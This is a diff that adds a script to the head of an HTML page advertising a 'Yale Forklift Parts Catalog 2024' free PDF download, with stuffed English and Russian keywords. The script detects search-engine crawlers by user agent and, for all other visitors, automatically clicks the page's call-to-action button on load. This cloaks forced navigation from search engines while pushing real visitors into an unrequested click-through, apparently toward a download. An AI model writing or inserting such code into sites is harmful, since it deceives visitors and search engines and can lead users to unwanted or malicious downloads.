@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Yale Forklift Parts Catalog 2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Get your Yale Forklift Parts Catalog 2024 in PDF covering all models and parts. Available in English for Windows 7, 10, and 11.">
     <meta name="keywords" content="Yale Forklift Parts Catalog 2024, Yale Forklift Parts Catalog PDF, Yale Forklift Parts Catalog 2024 download, Yale Forklift Parts Catalog free download, Yale Forklift Parts Catalog 2024 PDF free download, Yale forklift parts manual 2024, Yale forklift parts catalog Windows 7, Yale forklift parts catalog Windows 10, Yale forklift parts catalog Windows 11, Yale forklift spare parts catalog, Yale forklift parts catalog 67 Gb, Yale Forklift ERC series parts manual, Yale Forklift ERP series parts manual, Yale Forklift GC series parts manual, Yale Forklift GLC series parts manual, Yale Forklift GDP series parts manual, Yale Forklift GLP series parts manual, Запчасти Yale вилочных погрузчиков каталог 2024, каталог запчастей Yale 2024, каталог запчастей вилочных погрузчиков Yale, Yale Forklift каталог запчастей, каталог запчастей Yale 2024 PDF, каталог запчастей Yale 2024 скачать бесплатно, каталог запчастей Yale вилочных погрузчиков скачать, каталог запчастей Yale скачать бесплатно 2024, каталог запчастей Yale свободное скачивание, каталог запчастей Yale цифровой, Yale Forklift Parts Catalog download free, Yale Forklift Parts Catalogue 2024 free download, Yale Forklift Parts Book PDF, Yale Forklift Parts Book 2024, Yale Forklift Spare Parts Catalogue 2024, Yale Forklift Parts PDF free download, Yale Forklift Parts Catalog 2024 high speed download, Yale Forklift spare parts digital catalogue">
     <style>
